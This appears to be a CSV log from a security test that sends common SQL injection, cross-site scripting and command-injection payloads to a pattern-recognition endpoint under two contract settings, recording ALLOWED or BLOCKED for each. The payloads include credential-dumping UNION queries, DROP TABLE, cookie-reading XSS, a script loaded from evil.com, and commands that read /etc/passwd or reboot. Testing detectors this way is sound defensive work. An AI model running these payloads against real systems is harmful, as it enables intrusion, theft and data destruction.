timestamp,attack_type,description,payload,contract_type,result,http_status,response_body
2025-10-12T18:02:38.050562,SQLi,Classic Tautology,' OR 1=1--,Weak Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:02:38.056374,SQLi,Classic Tautology,' OR 1=1--,Strict Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:02:38.162559,SQLi,Tautology with Comment,' OR 'a'='a,Weak Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:02:38.164754,SQLi,Tautology with Comment,' OR 'a'='a,Strict Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:02:38.269623,SQLi,Boolean-based Blind,AND 1=1,Weak Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:02:38.276727,SQLi,Boolean-based Blind,AND 1=1,Strict Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:02:38.386994,SQLi,UNION Statement,"UNION SELECT user, password FROM users",Weak Contract,ALLOWED,200,"{""pattern_name"": ""SQLi Union"", ""status"": ""pattern_received""}"
2025-10-12T18:02:38.393712,SQLi,UNION Statement,"UNION SELECT user, password FROM users",Strict Contract,ALLOWED,200,"{""pattern_name"": ""SQLi Union"", ""status"": ""pattern_received""}"
2025-10-12T18:02:38.500849,SQLi,Stacked Query,'; DROP TABLE members;--,Weak Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:02:38.507175,SQLi,Stacked Query,'; DROP TABLE members;--,Strict Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:02:38.615928,SQLi,Error-based,"OR 1=CAST(CONCAT(0x7e,(SELECT user())) AS SIGNED)",Weak Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:02:38.622468,SQLi,Error-based,"OR 1=CAST(CONCAT(0x7e,(SELECT user())) AS SIGNED)",Strict Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:02:38.730028,SQLi,Time-based Blind,"OR IF(1=1, SLEEP(5), 0)",Weak Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:02:38.736567,SQLi,Time-based Blind,"OR IF(1=1, SLEEP(5), 0)",Strict Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:02:38.846067,SQLi,Authentication Bypass,admin'--,Weak Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:02:38.852561,SQLi,Authentication Bypass,admin'--,Strict Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:02:38.960732,SQLi,Double Quote Tautology,""" OR 1=1--",Weak Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:02:38.966672,SQLi,Double Quote Tautology,""" OR 1=1--",Strict Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:02:39.075183,SQLi,Wildcard Bypass,' OR '%'=',Weak Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:02:39.081821,SQLi,Wildcard Bypass,' OR '%'=',Strict Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:02:39.190778,XSS,Basic Script Tag,<script>alert('XSS')</script>,Weak Contract,ALLOWED,200,"{""pattern_name"": ""Basic XSS"", ""status"": ""pattern_received""}"
2025-10-12T18:02:39.196551,XSS,Basic Script Tag,<script>alert('XSS')</script>,Strict Contract,ALLOWED,200,"{""pattern_name"": ""Basic XSS"", ""status"": ""pattern_received""}"
2025-10-12T18:02:39.300800,XSS,Image OnError,<img src=x onerror=alert(document.cookie)>,Weak Contract,ALLOWED,200,"{""pattern_name"": ""Img XSS"", ""status"": ""pattern_received""}"
2025-10-12T18:02:39.307007,XSS,Image OnError,<img src=x onerror=alert(document.cookie)>,Strict Contract,ALLOWED,200,"{""pattern_name"": ""Img XSS"", ""status"": ""pattern_received""}"
2025-10-12T18:02:39.415867,XSS,Body OnLoad,<body onload=alert(1)>,Weak Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:02:39.422378,XSS,Body OnLoad,<body onload=alert(1)>,Strict Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:02:39.531574,XSS,SVG OnLoad,<svg/onload=alert(1)>,Weak Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:02:39.538580,XSS,SVG OnLoad,<svg/onload=alert(1)>,Strict Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:02:39.647724,XSS,Iframe Source,"<iframe src=""javascript:alert(1)"">",Weak Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:02:39.654509,XSS,Iframe Source,"<iframe src=""javascript:alert(1)"">",Strict Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:02:39.762030,XSS,Case Insensitive,<ScRiPt>alert(1)</sCrIpT>,Weak Contract,ALLOWED,200,"{""pattern_name"": ""Basic XSS"", ""status"": ""pattern_received""}"
2025-10-12T18:02:39.769116,XSS,Case Insensitive,<ScRiPt>alert(1)</sCrIpT>,Strict Contract,ALLOWED,200,"{""pattern_name"": ""Basic XSS"", ""status"": ""pattern_received""}"
2025-10-12T18:02:39.878897,XSS,No Closing Tag,<script src=http://evil.com/xss.js>,Weak Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:02:39.885845,XSS,No Closing Tag,<script src=http://evil.com/xss.js>,Strict Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:02:39.995224,XSS,Anchor Href,"<a href=""javascript:alert(1)"">Click me</a>",Weak Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:02:40.001917,XSS,Anchor Href,"<a href=""javascript:alert(1)"">Click me</a>",Strict Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:02:40.110861,XSS,Input Autofocus,<input onfocus=alert(1) autofocus>,Weak Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:02:40.117337,XSS,Input Autofocus,<input onfocus=alert(1) autofocus>,Strict Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:02:40.225864,XSS,Video Poster,<video poster=javascript:alert(1)>,Weak Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:02:40.232191,XSS,Video Poster,<video poster=javascript:alert(1)>,Strict Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:02:40.338729,Cmd Injection,Simple Pipe,| whoami,Weak Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:02:40.342111,Cmd Injection,Simple Pipe,| whoami,Strict Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:02:40.449208,Cmd Injection,Semicolon Separator,; ls -la /,Weak Contract,ALLOWED,200,"{""pattern_name"": ""Command Injection"", ""status"": ""pattern_received""}"
2025-10-12T18:02:40.454766,Cmd Injection,Semicolon Separator,; ls -la /,Strict Contract,ALLOWED,200,"{""pattern_name"": ""Command Injection"", ""status"": ""pattern_received""}"
2025-10-12T18:02:40.562763,Cmd Injection,Logical AND,&& cat /etc/passwd,Weak Contract,ALLOWED,200,"{""pattern_name"": ""Command Injection"", ""status"": ""pattern_received""}"
2025-10-12T18:02:40.568297,Cmd Injection,Logical AND,&& cat /etc/passwd,Strict Contract,ALLOWED,200,"{""pattern_name"": ""Command Injection"", ""status"": ""pattern_received""}"
2025-10-12T18:02:40.675925,Cmd Injection,Logical OR,|| ping -c 4 evil.com,Weak Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:02:40.683498,Cmd Injection,Logical OR,|| ping -c 4 evil.com,Strict Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:02:40.791871,Cmd Injection,Backticks,`uname -a`,Weak Contract,ALLOWED,200,"{""pattern_name"": ""Command Injection"", ""status"": ""pattern_received""}"
2025-10-12T18:02:40.797720,Cmd Injection,Backticks,`uname -a`,Strict Contract,ALLOWED,200,"{""pattern_name"": ""Command Injection"", ""status"": ""pattern_received""}"
2025-10-12T18:02:40.906511,Cmd Injection,Command Substitution,$(reboot),Weak Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
